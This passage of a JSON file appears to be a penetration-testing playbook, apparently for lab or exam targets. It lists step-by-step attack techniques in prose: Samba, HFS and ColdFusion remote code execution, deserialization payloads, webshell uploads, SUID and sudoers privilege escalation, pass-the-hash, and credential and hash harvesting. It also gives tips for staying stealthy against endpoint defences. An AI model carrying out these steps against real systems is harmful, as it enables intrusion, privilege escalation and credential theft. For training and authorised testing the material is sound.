      "win": "Arbitrary command execution confirmed as SYSTEM on Windows IoT target.",
      "mistakes": [
        "Targeting wrong port (Sirep listens on UDP/TCP 29819 and 29820) or omitting cmd.exe wrapper."
      ]
    },
    {
      "when": "Running under SYSTEM context on Windows IoT and auditing stored administrator credentials.",
      "land": [
        "Import-Clixml unpacks DPAPI-encrypted PSCredential objects, revealing cleartext network credentials."
      ],
      "look": [
        "Extracted cleartext administrator password string."
      ],
      "win": "Plaintext administrative password recovered from Windows IoT configuration XML.",
      "mistakes": [
        "Attempting Import-Clixml from a non-SYSTEM user context without machine DPAPI master keys."
      ]
    }
  ],
  "chkrootkit-local-privesc": [
    {
      "when": "You have low-privilege access and chkrootkit (<0.49) runs periodically via root cron.",
      "land": [
        "Plant a malicious executable script named /tmp/update which chkrootkit executes unconditionally."
      ],
      "look": [
        "/tmp/update script created with execution permissions."
      ],
      "win": "Privilege escalation hook planted for next scheduled chkrootkit run.",
      "mistakes": [
        "Forgetting chmod +x on /tmp/update or planting in a noexec mount."
      ]
    },
    {
      "when": "The root chkrootkit cron job has fired, applying SUID permissions to /bin/bash.",
      "land": [
        "Execute bash with -p to preserve the effective root UID without dropping privileges."
      ],
      "look": [
        "Interactive bash prompt with euid=0 (root)."
      ],
      "win": "Root shell access confirmed.",
      "mistakes": [
        "Running without -p, causing bash to drop SUID root privileges."
      ]
    }
  ],
  "rejetto-hfs-rce": [
    {
      "when": "Port 80 hosts Rejetto HttpFileServer (HFS 2.3) vulnerable to CVE-2014-6287.",
      "land": [
        "Inject a null byte followed by macro code {.+exec|...} into the HTTP search parameter."
      ],
      "look": [
        "HTTP 200 response with server executing payload command in background."
      ],
      "win": "Remote code execution triggered against Rejetto HttpFileServer.",
      "mistakes": [
        "Omitting null byte (%00) before macro syntax or failing to URL-encode parameters."
      ]
    },
    {
      "when": "Preparing complex PowerShell reverse shell cradle payloads for HFS macro delivery.",
      "land": [
        "URL-encode all quotes and spaces to ensure clean transmission across HTTP GET queries."
      ],
      "look": [
        "Fully percent-encoded payload string ready for query insertion."
      ],
      "win": "Payload string properly escaped for transmission.",
      "mistakes": [
        "Unescaped double quotes breaking the HTTP GET request string."
      ]
    }
  ],
  "coldfusion-scheduled-task-rce": [
    {
      "when": "Port 8500 hosts Adobe ColdFusion 8 vulnerable to path traversal (CVE-2010-2861).",
      "land": [
        "Traverse directories through the locale parameter to read ColdFusion's password.properties."
      ],
      "look": [
        "Extracted password= SHA-1 hash for administrator account."
      ],
      "win": "ColdFusion administrative password hash disclosed.",
      "mistakes": [
        "Omitting null byte (%00en) termination on Windows ColdFusion instances."
      ]
    },
    {
      "when": "Authenticated to ColdFusion Administrator or exploiting unauthenticated task injection.",
      "land": [
        "Configure a scheduled task fetching your remote JSP webshell and saving it to webroot CFIDE."
      ],
      "look": [
        "Task configured successfully; JSP webshell accessible at /CFIDE/shell.jsp."
      ],
      "win": "JSP webshell written to ColdFusion webroot yielding interactive shell.",
      "mistakes": [
        "Targeting wrong publish path or webroot drive letter."
      ]
    }
  ],
  "samba-usermap-script-rce": [
    {
      "when": "Samba 3.0.20 through 3.0.25rc3 is exposed on port 139 or 445 (CVE-2007-2447).",
      "land": [
        "Send an MS-RPC authentication logon request with backtick-wrapped command in the username."
      ],
      "look": [
        "Immediate root shell connection received on your netcat listener."
      ],
      "win": "Instant root command execution established via Samba username map script.",
      "mistakes": [
        "Wrapping command in single quotes rather than backticks or omitting nohup."
      ]
    },
    {
      "when": "Auditing target SMB services for vulnerable Samba 3.0.20 implementations.",
      "land": [
        "Run Nmap NSE script to verify vulnerability state before exploitation."
      ],
      "look": [
        "VULNERABLE: Samba username map script command execution."
      ],
      "win": "Vulnerability presence validated.",
      "mistakes": [
        "Relying on anonymous share access when the vulnerability triggers during logon negotiation."
      ]
    }
  ],
  "h2-database-console-rce": [
    {
      "when": "Port 8082 hosts an exposed H2 Database Web Console allowing SQL execution.",
      "land": [
        "Define a Java alias function executing Runtime.getRuntime().exec and immediately invoke it."
      ],
      "look": [
        "Command output reflected in SQL query response table."
      ],
      "win": "Arbitrary Java runtime command execution confirmed on H2 Database host.",
      "mistakes": [
        "Syntax errors in Java method definition or missing $$ delimiter."
      ]
    },
    {
      "when": "Accessing H2 Database Web Console port 8082 with default or identified database settings.",
      "land": [
        "Submit login form with driver org.h2.Driver and default sa user to establish session."
      ],
      "look": [
        "HTTP 302 redirect or console query dashboard rendered."
      ],
      "win": "Authenticated session established in H2 Web Console.",
      "mistakes": [
        "Targeting wrong JDBC URL or database name."
      ]
    }
  ],
  "oracle-tns-odat-rce": [
    {
      "when": "Oracle TNS listener is discovered on port 1521 and active SID is unknown.",
      "land": [
        "Run ODAT sidguesser dictionary brute force to identify valid Oracle service names (XE, ORCL)."
      ],
      "look": [
        "[+] The following valid SIDs were found: XE."
      ],
      "win": "Valid Oracle System Identifier discovered for subsequent authentication probes.",
      "mistakes": [
        "Testing database authentication without first confirming an active Oracle SID."
      ]
    },
    {
      "when": "You have valid Oracle database credentials and port 1521 is reachable.",
      "land": [
        "Leverage ODAT dbmsscheduler module to create and execute a privileged system task."
      ],
      "look": [
        "[+] Job created and executed successfully; command payload executes as SYSTEM."
      ],
      "win": "Operating system command execution achieved through Oracle DBMS_SCHEDULER.",
      "mistakes": [
        "Omitting --sysdba flag for administrative accounts or using wrong Oracle SID."
      ]
    }
  ],
  "ftp-webroot-upload-webshell": [
    {
      "when": "Target exposes an IIS webroot (iisstart.htm, web.config, aspnet_client) over anonymous or authenticated writable FTP.",
      "land": [
        "Upload an ASPX webshell into the writable FTP directory using anonymous or recovered FTP credentials."
      ],
      "look": [
        "FTP 226 transfer complete response confirming shell.aspx was written to the directory."
      ],
      "win": "ASPX webshell uploaded directly into the IIS document root.",
      "mistakes": [
        "Uploading .php to an IIS server that only executes .aspx/.asp, or omitting --user when authenticated FTP is required."
      ]
    },
    {
      "when": "Target exposes an Apache or Nginx PHP webroot (index.php, wp-config.php) over anonymous or authenticated writable FTP.",
      "land": [
        "Upload a minimal PHP command shell into the writable FTP directory."
      ],
      "look": [
        "FTP 226 transfer complete response confirming shell.php landed in the webroot."
      ],
      "win": "PHP webshell uploaded directly into the Linux/PHP web server document root.",
      "mistakes": [
        "Uploading into a parent FTP home directory instead of the public_html/htdocs/wwwroot subdirectory served over HTTP."
      ]
    },
    {
      "when": "The webshell has been uploaded to the FTP-backed webroot and needs HTTP verification.",
      "land": [
        "Request the uploaded webshell URL on the active HTTP/HTTPS origin with a harmless identity command (whoami or id)."
      ],
      "look": [
        "OS command output (such as iis apppool\\defaultapppool or uid=33(www-data)) rendered in the HTTP response body."
      ],
      "win": "Remote code execution over HTTP confirmed; initial web foothold established.",
      "mistakes": [
        "Hitting port 80 when the FTP-mapped virtual host actually listens on an alternate HTTP/HTTPS port."
      ]
    }
  ],
  "gpg-private-key-decrypt": [
    {
      "when": "You recover an encrypted GPG private key or protected files during enumeration.",
      "land": [
        "gpg2john extracts the passphrase hash format, and John the Ripper initiates dictionary cracking."
      ],
      "look": [
        "Cracked passphrase revealed in John the Ripper stdout or john.pot file."
      ],
      "win": "Cleartext passphrase for GPG key successfully recovered.",
      "mistakes": [
        "Running John without a wordlist or with mismatched hash format."
      ]
    },
    {
      "when": "You have recovered the passphrase for an encrypted GPG private key.",
      "land": [
        "Import the key into the local GPG keyring and decrypt the encrypted archive or file."
      ],
      "look": [
        "Decrypted output file or cleartext stream containing keys or credentials."
      ],
      "win": "Target archive decrypted and cleartext data recovered.",
      "mistakes": [
        "Omitting --batch or --yes causing interactive terminal prompt hangs."
      ]
    }
  ],
  "npm-package-privesc": [
    {
      "when": "Auditing sudo permissions reveals npm install is allowed without a password.",
      "land": [
        "Construct a package.json containing a malicious command in the preinstall lifecycle hook."
      ],
      "look": [
        "package.json file written with valid JSON structure and preinstall hook."
      ],
      "win": "Malicious npm package created ready for privileged installation.",
      "mistakes": [
        "Syntax errors in package.json or unescaped quotes in the preinstall script."
      ]
    },
    {
      "when": "Malicious npm package is prepared and target allows sudo npm install.",
      "land": [
        "Run sudo npm install with -g pointing to the local package folder to invoke the hook as root."
      ],
      "look": [
        "Reverse shell connection caught or command execution running under root context."
      ],
      "win": "Root privileges obtained via npm package preinstall execution.",
      "mistakes": [
        "Target system running with --ignore-scripts flag or restricted network access for reverse shell."
      ]
    }
  ],
  "http-request-smuggling-auth": [
    {
      "when": "Target infrastructure employs dual proxy / backend architecture (e.g. Nginx + HAProxy).",
      "land": [
        "Send an HTTP request with conflicting Content-Length and Transfer-Encoding headers to test for CL.TE discrepancy."
      ],
      "look": [
        "HTTP 400 or unexpected delayed response indicating desync in proxy pipeline."
      ],
      "win": "HTTP request smuggling discrepancy confirmed on target reverse proxy.",
      "mistakes": [
        "Failing to send raw CRLF sequence or malformed chunk size in payload."
      ]
    },
    {
      "when": "HTTP request smuggling confirmed and seeking to capture administrative tokens.",
      "land": [
        "Smuggle an incomplete request that prepends to subsequent backend requests, leaking headers into the next response."
      ],
      "look": [
        "Captured Authorization bearer headers, API tokens, or session cookies in smuggled response body."
      ],
      "win": "Administrative authentication credentials or session tokens successfully captured.",
      "mistakes": [
        "Smuggling timing mismatch where payload expires before victim user request arrives."
      ]
    }
  ],
  "nginx-log-poisoning-lfi": [
    {
      "when": "Target web application has Local File Inclusion and Nginx access logs are readable.",
      "land": [
        "Issue an HTTP request containing a PHP command execution snippet inside the User-Agent header."
      ],
      "look": [
        "HTTP 200 or 404 response confirming request was processed and logged to access.log."
      ],
      "win": "PHP webshell payload injected into web server access log.",
      "mistakes": [
        "Using characters that get URL-encoded or corrupting the access log with syntax errors."
      ]
    },
    {
      "when": "Access log has been poisoned with PHP payload and LFI parameter is reachable.",
      "land": [
        "Request the LFI parameter pointing to /var/log/nginx/access.log with command execution parameter."
      ],
      "look": [
        "Command output rendered at the position of the poisoned log line in response."
      ],
      "win": "Arbitrary command execution achieved via LFI access log inclusion.",
      "mistakes": [
        "Target access log has rotated or file permissions prevent web server from reading /var/log/nginx/access.log."
      ]
    }
  ],
  "zabbix-agent-system-run": [
    {
      "when": "Port scan identifies Zabbix Agent active on port 10050.",
      "land": [
        "Invoke zabbix_get passing item key system.run[\"id\"] to test for remote command execution."
      ],
      "look": [
        "Response returning uid=... gid=... (zabbix)."
      ],
      "win": "Remote command execution verified via Zabbix Agent system.run.",
      "mistakes": [
        "Target agent has EnableRemoteCommands=0 or rejects connection from unwhitelisted server IP."
      ]
    },
    {
      "when": "system.run execution confirmed on Zabbix Agent and foothold is required.",
      "land": [
        "Submit an interactive bash reverse shell command string wrapped in system.run."
      ],
      "look": [
        "Incoming TCP connection received on designated netcat listener."
      ],
      "win": "Interactive reverse shell established as the zabbix service user.",
      "mistakes": [
        "Special characters breaking zabbix item key quotation syntax."
      ]
    }
  ],
  "myfaces-viewstate-deserialization-rce": [
    {
      "when": "Web application uses Apache MyFaces with vulnerable JavaServer Faces ViewState handling.",
      "land": [
        "Generate a serialized Java payload using ysoserial with an appropriate gadget chain (CommonsCollections5)."
      ],
      "look": [
        "Binary payload generated without errors."
      ],
      "win": "Java deserialization gadget payload generated.",
      "mistakes": [
        "Selecting a gadget chain whose library dependencies are absent on target classpath."
      ]
    },
    {
      "when": "Serialized payload is generated, DES-encrypted, and HMAC-signed with target keys.",
      "land": [
        "POST the forged javax.faces.ViewState parameter to the JSF endpoint."
      ],
      "look": [
        "HTTP 200 or 500 response accompanying reverse shell connection or out-of-band callback."
      ],
      "win": "Remote code execution triggered via MyFaces ViewState deserialization.",
      "mistakes": [
        "Incorrect HMAC key or algorithm causing target to discard ViewState before deserialization."
      ]
    }
  ],
  "node-serialize-rce": [
    {
      "when": "Target application uses node-serialize and parses untrusted cookies or JSON input.",
      "land": [
        "Generate a base64-encoded serialized JSON payload with IIFE syntax using the _$$ND_FUNC$$_ prefix."
      ],
      "look": [
        "Base64 string encoding valid serialized JavaScript object with executable function."
      ],
      "win": "Exploit payload constructed for node-serialize deserialization flaw.",
      "mistakes": [
        "Omitting trailing parentheses () causing function definition without immediate invocation."
      ]
    },
    {
      "when": "Payload is prepared and target accepts serialized cookie or parameter.",
      "land": [
        "Submit the base64-encoded cookie in an HTTP GET/POST request."
      ],
      "look": [
        "Connection callback on listener or command output reflected in response."
      ],
      "win": "Remote command execution achieved on Node.js server via node-serialize.",
      "mistakes": [
        "Cookie name mismatch or URL-encoding breaking base64 characters."
      ]
    }
  ],
  "screen-suid-privesc": [
    {
      "when": "You have identified Screen 4.5.0 SUID and need to stage exploit dependencies on the target.",
      "land": [
        "Fetch precompiled libhax.so and rootshell binaries from your local HTTP staging server into /tmp."
      ],
      "look": [
        "Both files successfully downloaded to /tmp with rootshell marked executable (chmod +x)."
      ],
      "win": "Required helper binaries staged in writable target directory.",
      "mistakes": [
        "Target firewall blocking outbound HTTP or forgotten chmod +x on rootshell."
      ]
    },
    {
      "when": "Exploit artifacts are in place and you are ready to trigger SUID ld.so.preload injection.",
      "land": [
        "Invoke screen-4.5.0 with logfile redirection to write /tmp/libhax.so path into /etc/ld.so.preload, then trigger execution."
      ],
      "look": [
        "/etc/ld.so.preload populated with library path and execution of /tmp/rootshell yielding a root prompt (#)."
      ],
      "win": "Instant root shell spawned via Screen 4.5.0 SUID arbitrary preload abuse.",
      "mistakes": [
        "Not changing directory to /etc or umask 000 not set before logfile creation."
      ]
    }
  ],
  "aerospike-udf-rce": [
    {
      "when": "Aerospike service or API endpoint is discovered and port 3000 requires connectivity verification.",
      "land": [
        "Connect directly to TCP port 3000 using Netcat to verify daemon response."
      ],
      "look": [
        "Connection established banner or binary protocol handshake prompt."
      ],
      "win": "Aerospike database port verified open and listening.",
      "mistakes": [
        "Confusing Aerospike binary protocol port (3000) with HTTP REST port (8080/80)."
      ]
    },
    {
      "when": "Port 3000 is open and Aerospike version <= 5.1.0.6 is confirmed vulnerable to UDF execution.",
      "land": [
        "Execute UDF exploit script to register malicious Lua module executing system reverse shell."
      ],
      "look": [
        "Exploit reports successful UDF registration and reverse shell connects back to netcat listener."
      ],
      "win": "Remote shell access obtained under the aerospike user context.",
      "mistakes": [
        "Netcat listener not running prior to script execution or misconfigured lhost IP."
      ]
    }
  ],
  "sqlite-table-extract": [
    {
      "when": "You have downloaded an SQLite database file from an exposed web directory or archive.",
      "land": [
        "Query SQLite table catalogue and table schemas to inspect database layout."
      ],
      "look": [
        "List of table names including user, account, or partner tables with column definitions."
      ],
      "win": "Database schema enumerated and credential-bearing tables identified.",
      "mistakes": [
        "Attempting to read database without sqlite3 installed or corrupted file download."
      ]
    },
    {
      "when": "Target table schemas are identified and you want to extract all stored rows.",
      "land": [
        "Execute SQL SELECT statement dumping rows and columns from target table."
      ],
      "look": [
        "Table rows displayed showing usernames, email addresses, and password hashes."
      ],
      "win": "Stored user credentials and password hashes successfully extracted.",
      "mistakes": [
        "Typo in table name or omitting quotes around SQL query string."
      ]
    }
  ],
  "usermin-auth-rce": [
    {
      "when": "Reconnaissance indicates port 20000 is listening and you want to verify Usermin web presence.",
      "land": [
        "Request HTTPS web root on port 20000 with TLS validation disabled and filter for Usermin banner."
      ],
      "look": [
        "HTTP 200 response containing Usermin / miniserv login form HTML."
      ],
      "win": "Usermin web portal verified active on target port 20000.",
      "mistakes": [
        "Using HTTP instead of HTTPS causing connection reset or handshake error."
      ]
    },
    {
      "when": "Usermin portal is running and valid user credentials have been recovered.",
      "land": [
        "Execute EDB-50234 exploit transmitting authenticated parameter injection to miniserv.pl."
      ],
      "look": [
        "Exploit authenticates successfully and spawns reverse shell to listening port."
      ],
      "win": "Interactive shell access established as user usermin.",
      "mistakes": [
        "Supplying invalid credentials or target version patched against miniserv parameter injection."
      ]
    }
  ],
  "snmp-process-cmdline-harvest": [
    {
      "when": "SNMP service is discovered and you want an overview of active running process names.",
      "land": [
        "Query Host Resources MIB hrSWRunName branch using bulk walk."
      ],
      "look": [
        "Numbered list of active executable names (e.g. services, backup scripts, sync utilities)."
      ],
      "win": "Complete process inventory obtained from target host.",
      "mistakes": [
        "Incorrect community string or using SNMPv1 walk for large process tables."
      ]
    },
    {
      "when": "Processes are identified and you need full command-line arguments to search for passed secrets.",
      "land": [
        "Query hrSWRunParameters branch dumping complete argument strings."
      ],
      "look": [
        "Argument strings revealing hardcoded usernames, passwords, or configuration paths."
      ],
      "win": "Cleartext credentials recovered from command-line parameters.",
      "mistakes": [
        "Overlooking long parameter strings or neglecting to redirect output to a file for grepping."
      ]
    }
  ],
  "ligolo-tunnel-pivot": [
    {
      "when": "You need to prepare Kali to receive an inbound routed tunnel connection from a pivot agent.",
      "land": [
        "Create local TUN interface, set it UP, and start ligolo-proxy listener on port 11601."
      ],
      "look": [
        "ligolo-proxy console displays listening status and waits for agent connections."
      ],
      "win": "Local tunnel endpoint configured and listener ready for callbacks.",
      "mistakes": [
        "Forgetting sudo for tuntap interface creation or port 11601 already bound."
      ]
    },
    {
      "when": "Kali proxy listener is active and you have code execution on the pivot foothold host.",
      "land": [
        "Run ligolo agent executable on foothold pointing back to your Kali IP and port."
      ],
      "look": [
        "Agent logs connection success and ligolo-proxy displays 'Agent joined' notification."
      ],
      "win": "Encrypted pivot tunnel session established between foothold and Kali.",
      "mistakes": [
        "Target firewall blocking outbound connection to port 11601 or missing -ignore-cert."
      ]
    },
    {
      "when": "Agent session is active in ligolo-proxy and 'start' command has been executed.",
      "land": [
        "Add routing table entry on Kali directing the target internal subnet through dev ligolo."
      ],
      "look": [
        "Route appears in 'ip route show' and pings or nmap scans to internal IPs succeed transparently."
      ],
      "win": "Transparent IP routing into target internal network established.",
      "mistakes": [
        "Routing wrong CIDR mask or forgetting to type 'start' inside the ligolo session prompt."
      ]
    }
  ],
  "win-interactive-shell": [
    {
      "when": "Port 5985 is open and you have valid domain or local user credentials.",
      "land": [
        "Launch Evil-WinRM connecting to target with plaintext username and password."
      ],
      "look": [
        "Evil-WinRM interactive PowerShell prompt PS C:\\Users\\... ready for input."
      ],
      "win": "Interactive WinRM shell prompt established.",
      "mistakes": [
        "Special characters in password not properly quoted or WinRM service disabled."
      ]
    },
    {
      "when": "Port 5985 is open and you possess a captured or dumped NTLM hash without plaintext.",
      "land": [
        "Authenticate via Evil-WinRM using Pass-the-Hash."
      ],
      "look": [
        "Evil-WinRM authenticates and drops into interactive PowerShell shell."
      ],
      "win": "Interactive PowerShell shell established via Pass-the-Hash.",
      "mistakes": [
        "Passing LM hash instead of NT hash or LM:NT combined format without stripping."
      ]
    },
    {
      "when": "Port 3389 is open or enabled and you have valid domain or local user credentials.",
      "land": [
        "Launch an interactive graphical RDP desktop session using xfreerdp."
      ],
      "look": [
        "Full Windows graphical desktop session opens in an xfreerdp window."
      ],
      "win": "Interactive RDP desktop session established on the target host.",
      "mistakes": [
        "Omitting /cert:ignore when connecting to a self-signed Windows RDP certificate."
      ]
    },
    {
      "when": "WinRM port 5985 is closed but ports 135 and 445 are open with administrative rights.",
      "land": [
        "Connect via WMI and SMB output transport using impacket-wmiexec."
      ],
      "look": [
        "Semi-interactive C:\\> command shell prompt displayed."
      ],
      "win": "Administrative command execution shell prompt obtained via WMI.",
      "mistakes": [
        "Target user lacks local administrative privileges required for WMI execution."
      ]
    },
    {
      "when": "Port 445 is accessible with administrator privileges and a direct SYSTEM shell is desired.",
      "land": [
        "Deploy service-based administrative shell using impacket-psexec."
      ],
      "look": [
        "Service created and interactive prompt spawned as NT AUTHORITY\\SYSTEM."
      ],
      "win": "Full interactive SYSTEM shell established over SMB.",
      "mistakes": [
        "Antivirus flagging or blocking dropped PsExec service executable."
      ]
    },
    {
      "when": "PsExec binary drop is detected or blocked by defensive tooling.",
      "land": [
        "Execute commands using SMB pipe communication without leaving binary artifacts on disk."
      ],
      "look": [
        "Interactive command shell prompt established via temporary service redirection."
      ],
      "win": "Stealthy administrative shell established over SMB.",
      "mistakes": [
        "Temporary service creation audited and blocked by endpoint monitoring."
      ]
    },
    {
      "when": "Ports 3389 (RDP) or 5985 (WinRM) are disabled or blocked by group policy and you hold administrative credentials.",
      "land": [
        "Add your user to Remote Desktop Users and Remote Management Users and enable RDP and WinRM remotely over SMB."
      ],
      "look": [
        "[+] Executed command via wmiexec / The command completed successfully / Updated rule(s)."
      ],
      "win": "RDP (3389) and WinRM (5985) are enabled on the host and xfreerdp / evil-winrm unlock.",
      "mistakes": [
        "Running without administrative rights on the target host."
      ]
    },
    {
      "when": "You have semi-interactive command execution and need a full continuous reverse shell.",
      "land": [
        "Execute PowerShell one-liner to download Nishang Invoke-PowerShellTcp script from Kali."
      ],
      "look": [
        "Inbound TCP connection caught on listening Netcat terminal."
      ],
      "win": "Fully interactive PowerShell reverse shell connected back to listener.",
      "mistakes": [
        "Netcat listener not active prior to invocation or AMSI blocking script string."
      ]
    },
    {
      "when": "You have extracted a user or computer authentication certificate (.crt/.key) via AD CS.",
      "land": [
        "Authenticate to WinRM using certificate and private key over SSL/TLS."
      ],
      "look": [
        "Interactive PowerShell prompt established under the certificate owner's identity."
      ],
      "win": "Interactive WinRM shell session established via PKI certificate authentication.",
      "mistakes": [
        "Certificate expired, missing client authentication EKU, or key password unhandled."
      ]
    },
    {
      "when": "You hold a valid Kerberos TGT or service ticket (.ccache) and NTLM authentication is disabled or rejected on WinRM.",
      "land": [
        "Export KRB5CCNAME pointing to the ccache file, ensure /etc/krb5.conf and /etc/hosts map the target FQDN and realm, and connect with evil-winrm -i <fqdn> -r <realm>."
      ],
      "look": [
        "*Evil-WinRM* PS C:\\Users\\...> interactive prompt authenticated via Kerberos."
      ],
      "win": "Interactive WinRM PowerShell session established using Kerberos ccache authentication.",
      "mistakes": [
        "Passing a raw IP address instead of the host FQDN with -i, or clock skew exceeding 5 minutes against the KDC."
      ]
    }
  ],
  "crack-modular-hash": [
    {
      "when": "You extracted a PBKDF2-SHA256, Gitea PBKDF2, or Django/Werkzeug modular hash ($pbkdf2-sha256$, sha256:iterations:salt:hash).",
      "land": [
        "Run hashcat with -m 10900 (PBKDF2-HMAC-SHA256) or let hashcat auto-detect the modular format against rockyou.txt."
      ],
      "look": [
        "Hashcat status Cracked and the hash:plaintext line."
      ],
      "win": "Modular web or application password hash cracked to plaintext.",
      "mistakes": [
        "Leaving incompatible prefix wrappers unformatted when hashcat expects raw $pbkdf2-sha256$ or sha256:iter:salt:hash."
      ]
    },
    {
      "when": "You have an Argon2 ($argon2id$, $argon2i$), Flask/Werkzeug (pbkdf2:sha256:...), or phpass ($P$B, $H$) hash, or you are on a CPU-only VM.",
      "land": [
        "Run John the Ripper with rockyou.txt; John auto-detects Argon2, PBKDF2, and phpass modular hashes cleanly on CPU."
      ],
      "look": [
        "Plaintext password printed next to the hash or shown via john --show hashes.txt."
      ],
      "win": "Argon2, Flask, or phpass hash cracked to a reusable plaintext password.",
      "mistakes": [
        "Forgetting john --show when the hash was already cracked in the potfile."
      ]
    },
    {
      "when": "You dumped a WordPress, phpBB3, or Joomla phpass hash ($P$... or $H$...) from a CMS database.",
      "land": [
        "Run hashcat -m 400 (phpass) against rockyou.txt."
      ],
      "look": [
        "$P$...:<plaintext> printed in hashcat output."
      ],
      "win": "CMS user or administrator password recovered in plaintext.",
      "mistakes": [
        "Using -m 0 (raw MD5) instead of -m 400 for salted phpass hashes."
      ]
    },
    {
      "when": "You extracted a bare 32-character hex digest from a web app database or legacy config file that looks like unsalted MD5.",
      "land": [
        "Run hashcat -m 0 against rockyou.txt to test raw MD5 at full speed."
      ],
      "look": [
        "<32-hex-digest>:<plaintext> in hashcat's cracked output."
      ],
      "win": "Unsalted MD5 application password hash cracked in seconds.",
      "mistakes": [
        "Confusing a Windows NTLM 32-hex hash (-m 1000) with a web database raw-MD5 32-hex hash (-m 0); test both if origin is ambiguous."
      ]
    },
    {
      "when": "You have a bare 32-hex raw-MD5 hash on a CPU-only VM where John is preferred over OpenCL hashcat.",
      "land": [
        "Pass --format=raw-md5 explicitly to both john and john --show."
      ],
      "look": [
        "Cracked plaintext printed by john --show --format=raw-md5."
      ],
      "win": "Raw-MD5 digest cracked cleanly on CPU via John the Ripper.",
      "mistakes": [
        "Omitting --format=raw-md5, causing John to misidentify a bare 32-hex string as LM or NT."
      ]
    }
  ],
  "jdwp-local-privesc": [
    {
      "when": "Local socket enumeration (ss -tulpn / netstat) on a Linux foothold shows a root-owned java process listening on loopback JDWP (e.g. 127.0.0.1:8000 or 5005).",
      "land": [
        "Forward the loopback JDWP port back to Kali with ssh -N -L (or chisel reverse port forward if you do not have SSH access)."
      ],
      "look": [
        "127.0.0.1:{{jdwp_port|8000}} open locally on Kali and answering the JDWP-Handshake banner."
      ],
      "win": "The target's root JVM debugger socket is reachable from Kali localhost.",
      "mistakes": [
        "Trying to connect directly to the target's external IP when JDWP is bound strictly to 127.0.0.1."
      ]
    },
    {
      "when": "The forwarded JDWP port is reachable on 127.0.0.1 from Kali.",
      "land": [
        "Run jdwp-shellifier.py with --break-on 'java.lang.String.indexOf' (or java.net.ServerSocket.accept) and --cmd to copy /bin/bash to /tmp/rootbash with SUID set."
      ],
      "look": [
        "Command successfully executed output from jdwp-shellifier once the JVM hits the breakpoint."
      ],
      "win": "The root JVM executes your command payload inside Runtime.getRuntime().exec().",
      "mistakes": [
        "Setting a breakpoint on a Java method that never runs while idle; curl or browse the Java service to trigger activity so the breakpoint fires."
      ]
    },
    {
      "when": "jdwp-shellifier confirms the payload executed on the target.",
      "land": [
        "On your target foothold shell, verify /tmp/rootbash is root-owned SUID and run /tmp/rootbash -p."
      ],
      "look": [
        "euid=0(root) in id output."
      ],
      "win": "Interactive root shell achieved from the unauthenticated JDWP debugger.",
      "mistakes": [
        "Forgetting -p on bash, which causes bash to drop effective uid 0 back to your unprivileged user."
      ]
    }
  ],
  "writable-etc-shadow-sudoers": [
    {
      "when": "/etc/shadow is writable by your user or a group you belong to (such as shadow).",
      "land": [
        "Generate a SHA-512 password hash with openssl passwd -6 and replace root's hash field in /etc/shadow, then su - root."
      ],
      "look": [
        "uid=0(root) gid=0(root) after switching to root with the new password."
      ],
      "win": "Direct root shell via /etc/shadow hash replacement.",
      "mistakes": [
        "Corrupting the colon-delimited fields in /etc/shadow without saving a backup copy first."
      ]
    },
    {
      "when": "/etc/sudoers or /etc/sudoers.d is writable by your user or group.",
      "land": [
        "Append a NOPASSWD:ALL rule for your current username to /etc/sudoers or /etc/sudoers.d/pwn."
      ],
      "look": [
        "Rule written cleanly with valid sudoers syntax."
      ],
      "win": "Passwordless sudo granted to your current user.",
      "mistakes": [
        "Introducing a syntax error into /etc/sudoers (which breaks sudo system-wide) or leaving world-writable permissions on a /etc/sudoers.d file."
      ]
    },
    {
      "when": "After adding your NOPASSWD sudoers rule or updating /etc/shadow.",
      "land": [
        "Escalate immediately to an interactive root shell with sudo su - and verify with id."
      ],
      "look": [
        "uid=0(root) gid=0(root)."
      ],
      "win": "Interactive root shell confirmed.",
      "mistakes": [
        "Forgetting to capture /root/proof.txt immediately after landing as root."
      ]
    }
  ],
  "linux-root-cred-harvest": [
    {
      "when": "Immediately after reaching root (uid=0) on a Linux host.",
      "land": [
        "Dump /etc/shadow for offline cracking and sweep /root and /home for SSH private keys and bash history."
      ],
      "look": [
        "root:$6$... hashes in /etc/shadow and -----BEGIN OPENSSH PRIVATE KEY----- blocks."
      ],
      "win": "Password hashes and SSH private keys harvested for lateral reuse.",
      "mistakes": [
        "Stopping at root.txt without checking whether the box holds keys or passwords for the next host."
      ]
    },
    {
      "when": "Searching for cleartext database, service, or domain passwords across configs on a rooted Linux host.",
      "land": [
        "Grep recursively across /var/www, /opt, /etc, /root, and /home for password, passwd, secret, and db_pass assignments."
      ],
      "look": [
        "Config lines assigning plaintext passwords or connection strings."
      ],
      "win": "Cleartext credentials recovered from configuration files or scripts.",
      "mistakes": [
        "Omitting /opt or /var/backups where custom application scripts keep service credentials."
      ]
    }
  ],
  "runas-savedcred-exec": [
    {
      "when": "Checking whether the current Windows user profile has cached credentials in Windows Credential Manager.",
      "land": [
        "Run cmdkey /list to enumerate saved targets and usernames (such as DOMAIN\\Administrator or local Administrator)."
      ],
      "look": [
        "Target: Domain:interactive=...\nUser: ...\n entries in cmdkey /list output."
      ],
      "win": "Cached privileged credential confirmed in Windows Credential Manager.",
      "mistakes": [
        "Skipping cmdkey /list during initial Windows enumeration."
      ]
    },
    {
      "when": "cmdkey /list shows a stored credential for Administrator or another privileged account.",
      "land": [
        "Execute a reverse shell binary or administrative command with runas /savecred /user:<cached_user> without being prompted for a password."
      ],
      "look": [
        "New shell callback or command output running as the stored privileged user."
      ],
      "win": "Elevated command execution under the stored Administrator token.",
      "mistakes": [
        "Passing a username format to /user: that does not match the User field shown in cmdkey /list."
      ]
    }
  ],
  "sebackup-serestore-abuse": [
    {
      "when": "whoami /priv shows SeBackupPrivilege enabled on your token.",
      "land": [
        "Save the SAM and SYSTEM registry hives to C:\\Windows\\Temp using reg save, which uses backup semantics to bypass ACLs."
      ],
      "look": [
        "The operation completed successfully. for both sam.save and system.save."
      ],
      "win": "SAM and SYSTEM registry hives exported to disk.",
      "mistakes": [
        "Running reg save from a non-elevated or non-backup-capable context without SeBackupPrivilege enabled."
      ]
    },
    {
      "when": "You want to read a protected file (such as proof.txt or a config file in Administrator's profile) using SeBackupPrivilege.",
      "land": [
        "Copy the file with robocopy /B (backup mode), which bypasses standard NTFS DACLs."
      ],
      "look": [
        "Copied : 1 in robocopy summary and the file contents printed via type."
      ],
      "win": "Protected file copied and read via backup mode.",
      "mistakes": [
        "Using copy or type directly (which do not pass FILE_FLAG_BACKUP_SEMANTICS) instead of robocopy /B."
      ]
    },
    {
      "when": "You transferred sam.save and system.save back to your Kali machine.",
      "land": [
        "Extract local Administrator and user NTLM hashes offline with impacket-secretsdump -sam sam.save -system system.save LOCAL."
